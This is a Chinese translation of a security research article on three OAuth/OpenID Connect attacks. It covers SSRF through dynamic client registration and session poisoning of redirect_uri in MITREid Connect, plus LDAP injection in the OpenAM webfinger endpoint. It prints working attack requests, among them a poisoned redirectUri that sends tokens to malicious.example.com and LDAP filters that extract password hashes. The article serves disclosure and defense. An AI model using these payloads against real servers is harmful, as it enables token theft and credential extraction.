# 隐藏的 OAuth 攻击向量

> 作者：**Michael Stepankin**（研究员）  
> Twitter：[@artsploit](https://twitter.com/artsploit)

- **发布时间：** 2021 年 3 月 24 日（星期三）14:59 UTC
- **更新日期：** 2021 年 3 月 25 日（星期四）14:49 UTC

## 引言

OAuth2 授权协议在过去十年中一直备受攻击。您可能已经听说过大量关于“return_uri”技巧、令牌泄露、针对客户端的 CSRF 风格攻击等等。然而，在这篇文章中，我们将介绍三个全新的 OAuth2 和 [OpenID](/web-security/oauth/openid) Connect 漏洞：“**动态客户端注册：设计导致的 SSRF**”、“**redirect_uri 会话投毒**”和“**WebFinger 用户枚举**”。我们将概述关键概念，在两个开源 [OAuth](/web-security/oauth) 服务器（ForgeRock OpenAM 和 MITREid Connect）上演示这些攻击，并提供一些如何自行检测这些漏洞的技巧。

如果您不熟悉一些经典的 OAuth 漏洞，请不要担心。虽然我们不会在这里讨论它们，但我们已经在我们 Web Security Academy 上广泛介绍了它们：[https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth)。

### 关于 OpenID 的说明

在深入探讨漏洞之前，我们应该简要谈谈 OpenID。OpenID Connect 是 OAuth 协议的一个流行扩展，它带来了许多新功能，包括 id_token、自动发现、配置端点等等。从渗透测试的角度来看，每当您测试一个 OAuth 应用程序时，目标服务器很可能也支持 OpenID，这极大地扩展了可用的攻击面。作为漏洞猎手，当您测试 OAuth 流程时，您应该尝试获取标准的“/.well-known/openid-configuration”端点。即使是在黑盒评估中，这也能为您提供大量信息。

## 第一章：动态客户端注册——设计导致的 SSRF

过去描述的许多 OAuth 攻击都针对授权端点，正如您每次登录时在浏览器流量中看到的那样。如果您在测试一个网站并看到类似“/authorize?client_id=aaa&redirect_uri=bbb”的请求，您可以相对确定这是一个 OAuth 端点，其中包含大量您可以测试的参数。同时，由于 OAuth 是一个复杂的协议，服务器可能支持额外的端点，即使它们从未在客户端 HTML 页面中被引用过。

您可能忽略的隐藏 URL 之一是**动态客户端注册端点**。为了成功认证用户，OAuth 服务器需要知道客户端应用程序的详细信息，例如“client_name”、“client_secret”、“redirect_uris”等。这些详细信息可以通过本地配置提供，但 OAuth 授权服务器也可能有一个特殊的注册端点。此端点通常映射到“/register”，并接受以下格式的 POST 请求：

```http
POST /connect/register HTTP/1.1
Content-Type: application/json
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...

{
  "application_type": "web",
  "redirect_uris": ["https://client.example.org/callback"],
  "client_name": "My Example",
  "logo_uri": "https://client.example.org/logo.png",
  "subject_type": "pairwise",
  "sector_identifier_uri": "https://example.org/rdrct_uris.json",
  "token_endpoint_auth_method": "client_secret_basic",
  "jwks_uri": "https://client.example.org/public_keys.jwks",
  "contacts": ["ve7jtb@example.org"],
  "request_uris": ["https://client.example.org/rf.txt"]
}
```

有两个规范定义了此请求中的参数：用于 OAuth 的 [RFC7591](https://tools.ietf.org/html/rfc7591) 和 [Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1)。

如您所见，其中许多值通过 URL 引用传递，看起来像是[服务器端请求伪造（SSRF）](https://portswigger.net/web-security/ssrf)的潜在目标。同时，我们测试的大多数服务器在收到注册请求时并不会立即解析这些 URL。相反，它们只是保存这些参数，并在稍后的 OAuth 授权流程中使用它们。换句话说，这更像是二阶 SSRF，这使得黑盒检测更加困难。

以下参数对于 SSRF 攻击特别有趣：

- **logo_uri** —— 引用客户端应用程序徽标的 URL。注册客户端后，您可以尝试使用新的“client_id”调用 OAuth 授权端点（“/authorize”）。登录后，服务器将要求您批准该请求，并可能显示来自“logo_uri”的图像。如果服务器自行获取图像，则 SSRF 应由此步骤触发。或者，服务器可能仅通过客户端“<img>”标签包含徽标。虽然这不会导致 SSRF，但如果 URL 未被转义，则可能导致跨站脚本（XSS）。

- **jwks_uri** —— 客户端 JSON Web Key Set [JWK] 文档的 URL。当使用 JWT 进行客户端认证 [RFC7523] 时，服务器需要此密钥集来验证向令牌端点发出的签名请求。为了测试此参数中的 SSRF，请使用恶意的“jwks_uri”注册一个新的客户端应用程序，执行授权流程以获取任何用户的授权码，然后使用以下正文获取“/token”端点：

  ```http
  POST /oauth/token HTTP/1.1
  ...

  grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...
  ```

  如果存在漏洞，服务器应向提供的“jwks_uri”发出服务器到服务器的 HTTP 请求，因为它需要此密钥来检查请求中“client_assertion”参数的有效性。不过，这可能只是一个[盲 SSRF](/web-security/ssrf/blind) 漏洞，因为服务器期望一个正确的 JSON 响应。

- **sector_identifier_uri** —— 此 URL 引用一个包含 redirect_uri 值的单个 JSON 数组的文件。如果支持，服务器可能会在您提交动态注册请求时立即获取此值。如果未立即获取，请尝试在服务器上为此客户端执行授权。由于它需要知道 redirect_uris 才能完成授权流程，这将强制服务器向您的恶意 sector_identifier_uri 发出请求。

- **request_uris** —— 此客户端允许的 request_uris 数组。授权端点可能支持“request_uri”参数，以提供包含请求信息的 JWT 的 URL（参见 [https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2](https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2)）。

  即使**未启用动态客户端注册**，或者需要身份验证，我们也可以通过使用“request_uri”在授权端点上尝试 SSRF：

  ```http
  GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt
  ```

  注意：不要将此参数与“redirect_uri”混淆。“redirect_uri”用于授权后的重定向，而“request_uri”在授权过程开始时由服务器获取。

  同时，我们见过的许多服务器不允许任意的“request_uri”值：它们只允许在客户端注册过程中预先注册的白名单 URL。这就是为什么我们需要事先提供“request_uris”：“https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt”。

以下参数也包含 URL，但通常**不**用于发起服务器到服务器的请求。它们而是用于客户端重定向/引用：

- **redirect_uri** —— 授权后用于重定向客户端的 URL
- **client_uri** —— 客户端应用程序主页的 URL
- **policy_uri** —— 依赖方客户端应用程序提供的 URL，以便最终用户了解其个人资料数据将如何使用。
- **tos_uri** —— 依赖方客户端提供的 URL，以便最终用户了解依赖方的服务条款。
- **initiate_login_uri** —— 使用 https 方案的 URI，第三方可以使用它来发起由 RP 发起的登录。也应该用于客户端重定向。

根据 OAuth 和 OpenID 规范，所有这些参数都是可选的，并不总是在特定服务器上支持，因此值得确定您的服务器支持哪些参数。

如果您以 OpenID 服务器为目标，“.well-known/openid-configuration”上的发现端点有时包含“registration_endpoint”、“request_uri_parameter_supported”和“require_request_uri_registration”等参数。这些可以帮助您找到注册端点和其他服务器配置值。

## CVE-2021-26715：MITREid Connect 中通过“logo_uri”的 SSRF

[MITREid Connect](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server) 充当一个独立的 OAuth 授权服务器。在默认配置中，其大部分页面需要适当的授权，您甚至不能创建新用户——只有管理员被允许创建新帐户。

它还实现了 [OpenID 动态客户端注册](https://openid.net/specs/openid-connect-registration-1_0.html)协议，并支持注册客户端 OAuth 应用程序。虽然此功能仅从管理面板中引用，但实际的“/register”端点根本不检查当前会话。

通过查看源代码，我们发现 MITREid Connect 以以下方式使用“logo_uri”：

- 在注册过程中，客户端应用程序可以指定其“logo_uri”参数，该参数指向与应用程序关联的图像。此“logo_uri”参数可以是任意 URL。
- 在授权步骤中，当用户被要求批准此新应用程序请求的访问时，授权服务器会发出服务器到服务器的 HTTP 请求，从“logo_uri”参数下载图像，将其缓存，并与其他信息一起显示给用户。

此过程发生在用户访问“/openid-connect-server-webapp/api/clients/{id}/logo”端点时，该端点返回获取的“logo_uri”的内容。具体而言，易受攻击的控制器位于 [org.mitre.openid.connect.web.ClientAPI#getClientLogo](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/master/openid-connect-server/src/main/java/org/mitre/openid/connect/web/ClientAPI.java#L509)。

由于服务器不检查检索到的内容是否实际上是图像，攻击者可能滥用此功能请求授权服务器可访问的任何 URL 并显示其内容，从而导致[服务器端请求伪造（SSRF）](https://portswigger.net/web-security/ssrf)攻击。

此功能也可能被滥用以执行[跨站脚本（XSS）](https://portswigger.net/web-security/cross-site-scripting)攻击，因为“getClientLogo”控制器不强制任何图像“Content-Type”头，允许攻击者从其自己的 URL 显示任意 HTML 内容。如果此 HTML 包含 JavaScript 代码，它将在授权服务器域内执行。

### 利用

我们需要如上所述发送动态客户端注册请求。在这种情况下，我们需要提供的最少参数是“redirect_uri”和“logo_uri”：

```http
POST /openid-connect-server-webapp/register HTTP/1.1
Host: local:8080
Content-Length: 118
Content-Type: application/json

{
  "redirect_uris": [
    "http://artsploit.com/redirect"
  ],
  "logo_uri": "http://artsploit.com/xss.html"
}
```

为了向指定的“logo_uri”：“http://artsploit.com/xss.html”发起服务器到服务器的请求，用户应导航到“/api/clients/{client.id}/logo”页面：

![页面显示 SSRF 攻击的输出](/cms/images/c1/73/1768-article-oauth1.png)

访问最后页面需要一个低权限账户。如果攻击者能够通过注册获得一个，他们可以使用此端点向本地服务器发出任意 HTTP 请求并显示其结果。

或者，此攻击可以针对已经认证的用户进行[XSS](/web-security/cross-site-scripting)攻击，因为它允许您在页面上注入任意 JavaScript。如上例所示，恶意的“logo_uri”：“http://artsploit.com/xss.html”可用于执行“alert(document.domain)”函数。

{client.id} 参数是与向 OAuth 服务器注册的每个新客户端关联的增量值。它可以在客户端注册后无需任何凭据即可获得。由于创建服务器时已经存在一个默认客户端应用程序，因此第一个动态注册的客户端将具有 client_id “2”。

从这个利用中可以看出，OAuth 服务器可能在注册端点存在二阶 SSRF 漏洞，因为规范明确规定许多值可以通过 URL 引用提供。这些漏洞很难发现，但由于 OAuth 注册请求格式是标准化的，即使在黑盒场景下也有可能发现。

## 第二章：“redirect_uri”会话投毒

我们接下来要看的漏洞在于服务器在身份验证流程中传递参数的方式。

根据 OAuth 规范（[RFC6749](https://tools.ietf.org/html/rfc6749#section-4.1.1) 的 4.1.1 节），每当 OAuth 服务器收到授权请求时，它应该“验证请求以确保所有必需参数都存在且有效。如果请求有效，授权服务器将认证资源所有者并获得授权决定（通过询问资源所有者或通过其他方式建立批准）”。

听起来很简单，对吧？在几乎所有 OAuth 图中，此过程显示为单一步骤，但实际上它涉及三个需要由 OAuth 服务器实现的不同操作：

1. 验证所有请求参数（包括“client_id”、“redirect_uri”）。
2. 认证用户（通过登录表单提交或任何其他方式）。
3. 询问用户是否同意与外部方共享数据。
4. 将用户重定向回外部方（在参数中带有代码/令牌）。

在我们见过的许多 OAuth 服务器实现中，这些步骤通过使用三个不同的控制器来分离，类似于“/authorize”、“/login”和“/confirm_access”。

在第一步（“/authorize”）中，服务器检查“redirect_uri”和“client_id”参数。之后，在“/confirm_access”阶段，服务器需要使用这些参数来颁发代码。那么服务器如何记住它们呢？最明显的方式是：

1. 将“client_id”和“redirect_uri”参数存储在会话中。
2. 在每一步的 HTTP 查询参数中携带它们。这可能需要在每一步进行有效性检查，并且验证程序可能不同。
3. 创建一个新的“interaction_id”参数，唯一标识与服务器发起的每个 OAuth 授权流程。

正如我们所见，这是严格的 OAuth 规范并未真正给出任何建议的地方。因此，存在多种实现此行为的方法。

第一种方法（存储在会话中）非常直观，在代码中看起来很优雅，但当同一用户同时发送多个授权请求时，它可能导致竞争条件问题。

让我们仔细看看这个示例。该过程以普通的授权请求开始：

```http
/authorize?client_id=client&response_type=code&redirect_uri=http://artsploit.com/
```

服务器检查参数，将它们存储在会话中，并显示同意页面：

![页面要求批准客户端](/cms/images/c7/1d/1921-article-oauth2.png)

在我们点击“Authorize”后，以下请求被发送到服务器：

![确认后发送到服务器的请求](/cms/images/66/ca/9762-article-oauth3.png)

如您所见，请求体**不包含**有关被授权的客户端的任何参数，这意味着服务器从用户会话中获取它们。我们甚至可以在黑盒测试中发现这种行为。

基于此行为的攻击将如下进行：

1. 用户访问一个特制页面（就像典型的 XSS/CSRF 攻击场景）。
2. 该页面重定向到带有“受信任”“client_id”的 OAuth 授权页面。
3. （在后台）该页面发送一个隐藏的跨域请求到带有“不可信”“client_id”的 OAuth 授权页面，从而投毒会话。
4. 用户批准第一个页面，并且由于会话包含更新后的值，用户将被重定向到不可信客户端的“redirect_uri”。

在许多真实系统中，第三方用户可以注册自己的客户端，因此此漏洞可能允许他们注册一个任意的“redirect_uri”并将令牌泄露给它。

然而，有一些注意事项：用户必须批准任何“受信任”的客户端。如果他们之前已经批准了同一个客户端，服务器可能只是重定向我们而无需确认。方便的是，OpenID 规范为我们提供了“prompt=consent”参数，我们可以将其附加到授权请求的 URL 中，以潜在地解决这个问题。如果服务器遵循 OpenID 规范，即使之前已授予同意，它也应该要求用户确认其同意。如果没有确认，利用会更加困难，但仍然可行，具体取决于特定的 OAuth 服务器实现。

## CVE-2021-27582：[MITREid Connect] 通过 Spring 自动绑定绕过“redirect_uri”

MITREid Connect 服务器容易受到上述会话投毒问题的影响。在这种情况下，利用甚至不需要注册额外的客户端，因为应用程序在确认页面上存在批量赋值漏洞，这也导致会话投毒。

在 OAuth2 流程中，当用户导航到授权页面（“/authorize”）时，AuthorizationEndpoint 类正确检查所有提供的参数（client_id、redirect_uri、scope 等）。之后，当用户通过认证后，服务器显示一个确认页面，要求用户批准访问。用户的浏览器只看到“/authorize”页面，但在内部，服务器执行从“/authorize”到“/oauth/confirm_access”的内部请求转发。为了将参数从一个页面传递到另一个页面，服务器在[“/oauth/confirm_access”控制器](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/a2e8cb1a67a5546fdef11c604142a847e7c61261/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java#L104)上使用了一个“@ModelAttribute("authorizationRequest")”注解：

```java
@PreAuthorize("hasRole('ROLE_USER')")
@RequestMapping("/oauth/confirm_access")
public String confimAccess(Map<String, Object> model, @ModelAttribute("authorizationRequest") AuthorizationRequest authRequest, Principal p) {
```

这个注解有点棘手；它不仅从前一个控制器的模型中获取参数，而且**从当前 HTTP 请求查询**中获取它们的值。因此，如果用户直接在浏览器中导航到“/oauth/confirm_access”端点，它能够从 URL 提供所有 AuthorizationRequest 参数，并绕过“/authorize”页面上的检查。

唯一的注意事项是“/oauth/confirm_access”控制器需要在用户会话中存在 @SessionAttributes("authorizationRequest")。然而，这很容易实现，只需访问“/authorize”页面而不执行任何操作即可。此漏洞的影响类似于“redirect_uri”从未被检查的经典场景。

### 利用

恶意行为者可以构造两个特殊的链接，分别指向授权和确认端点，每个链接都有自己的“redirect_uri”参数，并提供给用户。

```http
/authorize?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect
```

```http
/oauth/confirm_access?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token
```

“client_id”参数可以来自用户已经信任的任何客户端应用程序。当访问“/confirm_access”时，它会从 URL 获取所有参数并投毒模型/会话。现在，当用户批准第一个请求时（因为“client_id”是受信任的），授权令牌将被泄露到恶意网站。

***注意：** 您可能注意到第一个请求中的“redirect_uri”与第二个请求中的“redirectUri”之间的有意差异。这是有意的，因为第一个是有效的 OAuth 参数，而第二个是在批量赋值期间实际绑定到“AuthorizationRequest.redirectUri”模型属性的参数名称。

这里的“@ModelAttribute("authorizationRequest")”注解不是必需的，并在转发过程中产生额外风险。执行相同操作的更安全方式是将这些值从“Map<String, Object> model”作为带有 @RequestMapping("/oauth/confirm_access") 注解的方法的输入参数。

即使这里不存在批量赋值，此漏洞仍然可能通过同时发送两个授权请求以共享同一会话来利用。

## 第三章：“/.well-known/webfinger”让所有用户名众所周知

“/.well-known/webfinger”是一个标准的 OpenID 端点，显示有关服务器上使用的用户和资源的信息。例如，它可以通过以下方式用于验证用户“anonymous”在服务器上是否有账户：

```http
/.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
```

![确认后发送到服务器的请求](/cms/images/96/8b/3527-article-oauth4.png)

这只是另一个 OpenID 端点，您在爬取过程中可能不会发现，因为它旨在由 OpenID 客户端应用程序使用，并且这些请求不是从浏览器端发送的。[规范](https://openid.net/specs/openid-connect-discovery-1_0.html)说“rel”参数应具有“http://openid.net/specs/connect/1.0/issuer”的静态值，而“resource”应包含以下形式之一的有效 URL：

- http://host/**user**
- acct://**user**@host

此 URL 在服务器上被解析，并不真正用于发送 HTTP 请求，因此这里不存在 SSRF。同时，您可以尝试在那里找到像 SQL 注入这样的普通漏洞，因为端点不应需要任何身份验证。

此端点的棘手之处在于响应状态码：如果参数无效或用户名未找到，它可能返回 404，因此在将其添加到内容发现工具时要小心。

## [ForgeRock OpenAM] Webfinger 协议中的 LDAP 注入

我们在 **ForgeRock 的 OpenAM 服务器**中发现了一个易受攻击的 webfinger 端点的好例子。这个商业软件曾经存在一个 LDAP 注入漏洞。

在源代码分析期间，我们发现当 OpenAM 服务器处理请求时，它将用户提供的 resource 参数嵌入到 LDAP 服务器的过滤查询中。LDAP 查询在 [SMSLdapObject.java](https://github.com/OpenRock/OpenAM/blob/master/openam-core/src/main/java/com/sun/identity/sm/ldap/SMSLdapObject.java#L882) 文件中构建：

```java
String[] objs = { filter };
String FILTER_PATTERN_ORG = "(&(objectclass="
  + SMSEntry.OC_REALM_SERVICE + ")(" + SMSEntry.ORGANIZATION_RDN
  + "={0}))";
String sfilter = MessageFormat.format(FILTER_PATTERN_ORG, (Object[]) objs);
```

如果 resource 包含特殊字符如“( ) ; , * |”，应用程序不会对它们应用任何转义，并随后将它们包含在 LDAP 查询过滤器中。

从攻击者的角度来看，可以使用 LDAP 过滤器访问存储在 LDAP 中的用户对象的不同字段。一种攻击场景可能是枚举有效用户名：

```http
/openam/.well-known/webfinger?resource=http://x/dsa*&rel=http://openid.net/specs/connect/1.0/issuer
```

如果任何用户名以“**dsa***”开头，服务器响应 HTTP 代码 200（OK），否则响应 HTTP 代码 404（Not Found）。

此外，我们可以基于用户密码指定过滤器：

```http
/openam/.well-known/webfinger?resource=http://x/dsameuser)(sunKeyValue=userPassword=A*)(%26&rel=http://openid.net/specs/connect/1.0/issuer
```

![正确密码通配符猜测的响应](/cms/images/37/33/0091-article-oauth5.png)

![错误密码通配符猜测的响应](/cms/images/cc/ce/3586-article-oauth6.png)

这使我们能够**逐个字符地提取用户的密码哈希**。该攻击不仅限于提取用户属性；它还可用于提取有效的会话令牌或用于令牌签名的私钥。

同样，此漏洞存在于 OpenAm 服务器的标准 OpenID 组件中，不需要任何身份验证。

我们在 OpenAM 的最新开源版本中发现了此漏洞，位于 [https://github.com/OpenRock/OpenAM](https://github.com/OpenRock/OpenAM)。当我们向 ForgeRock 报告此漏洞时，他们的安全团队指出，从更新 13.5.1 开始，它已在产品的商业版本中修补（有关详细信息，请参见 [OPENAM-10135](https://bugster.forgerock.org/jira/browse/OPENAM-10135)）。

## 结论

OAuth 和 OpenID Connect 协议很复杂，有许多活动部件和扩展。如果您在网站上测试 OAuth 授权流程，您可能只看到一小部分受支持的参数和可用端点。虽然 Facebook、Google 和 Apple 可以自己实现这些协议，但较小的公司通常使用开源实现或您可以自行下载的商业产品。深入研究文档和 RFC，搜索错误，尝试在 Github 上查找源代码并检查 Docker 容器以识别您可以访问的所有功能：您会发现很多独特的漏洞。
